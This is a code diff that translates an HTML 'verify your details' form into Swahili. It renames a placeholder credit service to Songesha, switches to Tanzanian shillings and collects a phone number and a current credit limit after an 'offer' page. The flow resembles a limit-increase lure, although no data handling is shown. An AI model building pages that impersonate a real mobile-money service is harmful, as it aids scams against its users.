@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sw">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verify Your Details</title>
+    <title>Thibitisha Maelezo Yako</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -223,13 +223,13 @@
     <div class="app-container">
         <div class="header">
             <button class="back-button" onclick="window.location.href='offer.html'">←</button>
-            <div class="header-title">Verify Details</div>
+            <div class="header-title">Thibitisha Maelezo</div>
             <div class="header-spacer"></div>
         </div>
 
         <div class="content">
-            <h1>Verify Your Details</h1>
-            <p class="subtitle">We need your information to calculate your new limit</p>
+            <h1>Thibitisha Maelezo Yako</h1>
+            <p class="subtitle">Tunahitaji taarifa zako ili kukuhesabu kiwango chako kipya</p>
 
             <div class="step-indicator">
                 <div class="step-badge active">1</div>
@@ -238,7 +238,7 @@
 
             <form id="verify-form">
                 <div class="form-group">
-                    <label for="phone">Phone Number</label>
+                    <label for="phone">Namba ya Simu</label>
                     <div class="input-wrapper">
                         <span class="input-prefix">+255</span>
                         <input type="tel" 
@@ -251,12 +251,12 @@
                 </div>
 
                 <div class="form-group">
-                    <label for="current-limit">Current Kashagi Limit</label>
+                    <label for="current-limit">Kiwango Chako cha Sasa cha Songesha</label>
                     <div class="input-wrapper">
-                        <span class="input-prefix">$</span>
+                        <span class="input-prefix">TSh</span>
                         <input type="number" 
                                id="current-limit" 
-                               placeholder="Enter amount" 
+                               placeholder="Weka kiasi" 
                                inputmode="numeric">
                     </div>
                     <div class="error-message" id="limit-error"></div>
@@ -264,8 +264,8 @@
             </form>
 
             <div class="button-group">
-                <button class="back-btn" onclick="window.location.href='offer.html'">Back</button>
-                <button class="next-btn" id="continue-btn" disabled>Continue →</button>
+                <button class="back-btn" onclick="window.location.href='offer.html'">Nyuma</button>
+                <button class="next-btn" id="continue-btn" disabled>Endelea →</button>
             </div>
         </div>
     </div>
@@ -311,20 +311,20 @@
 
             // Validate phone
             if (phone.length !== 10 || !phone.startsWith('0')) {
-                phoneError.textContent = 'Please enter a valid 10-digit phone number.';
+                phoneError.textContent = 'Tafadhali weka namba ya simu sahihi yenye tarakimu 10.';
                 phoneError.classList.add('show');
                 return;
             }
 
             // Validate limit
             if (limit <= 0) {
-                limitError.textContent = 'Please enter your current Kashagi limit.';
+                limitError.textContent = 'Tafadhali weka kiwango chako cha sasa cha Songesha.';
                 limitError.classList.add('show');
                 return;
             }
 
-            if (limit > 100000) {
-                limitError.textContent = 'The amount seems too high. Please verify.';
+            if (limit > 10000000) {
+                limitError.textContent = 'Kiasi kinaonekana kuwa kikubwa sana. Tafadhali angalia tena.';
                 limitError.classList.add('show');
                 return;
             }
